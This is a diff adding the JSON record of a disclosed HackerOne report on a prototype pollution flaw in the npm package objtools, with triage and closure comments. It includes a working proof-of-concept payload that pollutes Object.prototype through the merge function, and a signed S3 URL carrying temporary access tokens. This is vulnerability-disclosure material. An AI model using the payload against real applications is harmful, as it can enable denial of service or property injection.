@@ -1,0 +1,266 @@
+{
+    "id": 878394,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NzgzOTQ=",
+    "url": "https://hackerone.com/reports/878394",
+    "title": "[objtools] Prototype pollution",
+    "state": "Closed",
+    "substate": "resolved",
+    "severity_rating": "high",
+    "readable_substate": "Resolved",
+    "created_at": "2020-05-19T21:40:21.546Z",
+    "submitted_at": "2020-05-19T21:40:21.546Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "d3lla",
+        "url": "/d3lla",
+        "profile_picture_urls": {
+            "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 23949,
+        "url": "https://hackerone.com/nodejs-ecosystem",
+        "handle": "nodejs-ecosystem",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "disabled",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Node.js third-party modules",
+            "twitter_handle": "",
+            "website": "https://nodejs.org/en/security/",
+            "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+        }
+    },
+    "has_bounty?": false,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": false,
+    "disclosed_at": "2020-09-14T10:51:58.317Z",
+    "bug_reporter_agreed_on_going_public_at": "2020-09-14T10:51:58.037Z",
+    "team_member_agreed_on_going_public_at": "2020-09-12T20:54:57.185Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "I would like to report a `prototype pollution` vulnerability in `objtools` module.\nIt allows an attacker to inject properties on Object.prototype.\n\n# Module\n\n**module name:** `objtools`\n**version:** `2.0.1`\n**npm page:** `https://www.npmjs.com/package/objtools`\n\n## Module Description\n\nobjtools provides several utility functions for working with structured objects. Basic examples of how to use are provided below. See the docs directory for full information.\n\n## Module Stats\n\n[30] weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe `merge` function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.\n\n## Steps To Reproduce:\n- install `objtools` module:\n    - `npm i objtools`\n\nCreate an object with `__proto__` property and pass it to the `merge` function:\n```javascript\n\nconst objtools = require('objtools');\nconst payload = JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}');\nlet obj = {};\nconsole.log(\"Before : \" + obj.polluted);\nobjtools.merge({}, payload);\nconsole.log(\"After : \" + obj.polluted);\n```\nOutput:\n```console\n\nBefore : undefined\nAfter : yes\n```\n{F835153}\n\n## Supporting Material/References:\n\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v14.1.0\n- NPM VERSION: 6.14.5\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n\nThank you for your time.\n\nbest regards,\n\nd3lla\n\n## Impact\n\nThe impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.",
+    "weakness": {
+        "id": 106,
+        "name": "Modification of Assumed-Immutable Data (MAID)"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 835153,
+            "file_name": "objtools_poc.mov",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hMtseQAswSH2Ngk2dWQBkfjA?response-content-disposition=attachment%3B%20filename%3D%22objtools_poc.mov%22%3B%20filename%2A%3DUTF-8%27%27objtools_poc.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYY3KUHY6%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T071814Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDbZ%2FrzMJPkXzqJKGhUDJxaKvRKOwgW3L9NoGgTQYNluwIgP%2FQUNBim5xYJkBE4bibyDr4jMY%2FqMgU8yTBdR9QfoSQquwUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDDEZLUDtzsol34pf1yqPBZq6rwka9dcUmP1Z24HNrPUaSjikKtPCd8tWm8aqp4p6845zp81qitLzXk9PwD9slj3c%2BSQSWjztZWIJEXZWIIlCQ8zW3V0YeF%2BPbkNoqrw1iHYiPAXC3t9y2cnp7uesZte%2B5t1Hb%2BbmTSUMQfTPsazLeu4nH%2F9MWkcvLY34rjH54kSRBSKoSpNPgPj2kSMe0Agn9jQ102utMKoMlhVvvqtnQmOO3yY83c9MPBbCmAsuXLoVvwRyAURznumXGaAY8T%2B16canJngAP7ML%2BGxqR9a4ioL%2FIEyZSARvH%2BOf1TL1KtnyqLRmKVMht7VNGhWu30mxL%2BAZvsBaOHSbngtEExTFVCGCjgA2bXH0nM7V4nVzgSBjnCm4xHKwlKw2UGiCKE1jyfYLNBgBnjuBeFtvw%2FIXEVAwP1X%2BGxr%2BBJEndKkov5kap4UxeFIHzwNu%2BuncV7Htjx%2B5Ceg3lS1dVXtigyLqfWS9ZDcUOzUU8a%2Bc2xMZW9%2FDGUXGEivZ6wchu7US3C7TYxKEqYefV4bC7u%2BQO8geofYjAWDWujYfUQPfe2CWBUQKd0IbyyY8dVsRqXxXquWP2PWT6zzBxgu8QOuklVxDBrNLKbnQ5Xm9tuf3xELeqIHfe%2BGfDIpigjAR4iago3Vsz8V7gdnhQUBe4ae8zi26qOx8xVbJBK3TtN9dyjtmyAO%2BWWqtf2WMN8S7GtgDCOEzmPtLc6hxX9Olifu0uGtBRSb0zE0EOX16pUQ7%2FFcPTQsSLqJC4c33cv%2BYTmjfyDDgUNUS4WbOmU0UwWv4bnaXCRIk8v9ZvvpaPfvZC1lx6k6alXR4GMigA2XBEFD852wBKdWpfiKe%2B4KEwnLNAeKE4xXaAmclAQBS8jFTLsYwsJ62pwY6sQHyCoWizkYjoXsyfeuh51YDF9e38C97iPYDjIXpJSSm1TTtLU%2FTGWnKeQisJw%2FcC8RKX7KKsFxYNATPCKUXKb05GVgEvZvvRtb71Ou3fUQO2phoABIv%2FguN%2BQLZIk23gYhvoCnzlJyh%2Bs4YT4Y9NBe%2BuO50gRcLkId0hIDo3s3rVFEHd3DeobVXe7TJmQ%2FoPHXywJmCBc5i%2FnGGtc8UW4nb1QByAu4MMgRtTUGscF6wF9Q%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4843e4c02ef6856d5410a15d1091e8abce7e1718755f2f2a4d7c78719cc81946",
+            "file_size": 306417,
+            "type": "video/quicktime"
+        }
+    ],
+    "allow_singular_disclosure_at": "2020-10-12T20:54:57.267Z",
+    "allow_singular_disclosure_after": -90757397.00513323,
+    "singular_disclosure_allowed": true,
+    "vote_count": 1,
+    "voters": [
+        "nightm4re"
+    ],
+    "severity": {
+        "rating": "high",
+        "author_type": "User"
+    },
+    "structured_scope": {
+        "databaseId": 2986,
+        "asset_type": "SOURCE_CODE",
+        "asset_identifier": "Other module",
+        "max_severity": "critical"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 8053146,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @d3lla,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@nochnoidozor",
+            "automated_response": false,
+            "created_at": "2020-05-19T23:20:34.850Z",
+            "updated_at": "2020-05-19T23:20:34.850Z",
+            "actor": {
+                "username": "nochnoidozor",
+                "cleared": false,
+                "verified": false,
+                "url": "/nochnoidozor",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        },
+        {
+            "id": 8053155,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "Hello @d3lla,\n\nThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nRegards,\n@nochnoidozor",
+            "automated_response": false,
+            "created_at": "2020-05-19T23:22:01.606Z",
+            "updated_at": "2020-05-19T23:22:01.606Z",
+            "actor": {
+                "username": "nochnoidozor",
+                "cleared": false,
+                "verified": false,
+                "url": "/nochnoidozor",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        },
+        {
+            "id": 9204557,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugResolved",
+            "message": "So far no response from the maintainer after I've emailed them.\nI'm closing this report and requesting disclosure.",
+            "automated_response": false,
+            "created_at": "2020-09-12T20:54:27.316Z",
+            "updated_at": "2020-09-12T20:54:51.125Z",
+            "actor": {
+                "username": "danielruf",
+                "cleared": false,
+                "verified": false,
+                "url": "/danielruf",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "reporter": {
+                "username": "d3lla",
+                "url": "/d3lla"
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        },
+        {
+            "id": 9204558,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-09-12T20:54:57.207Z",
+            "updated_at": "2020-09-12T20:54:57.207Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "danielruf",
+                "cleared": false,
+                "verified": false,
+                "url": "/danielruf",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        },
+        {
+            "id": 9212639,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-09-14T10:51:58.245Z",
+            "updated_at": "2020-09-14T10:51:58.245Z",
+            "actor": {
+                "username": "d3lla",
+                "cleared": false,
+                "verified": false,
+                "url": "/d3lla",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        },
+        {
+            "id": 9212640,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-09-14T10:51:58.349Z",
+            "updated_at": "2020-09-14T10:51:58.349Z",
+            "actor": {
+                "username": "d3lla",
+                "cleared": false,
+                "verified": false,
+                "url": "/d3lla",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
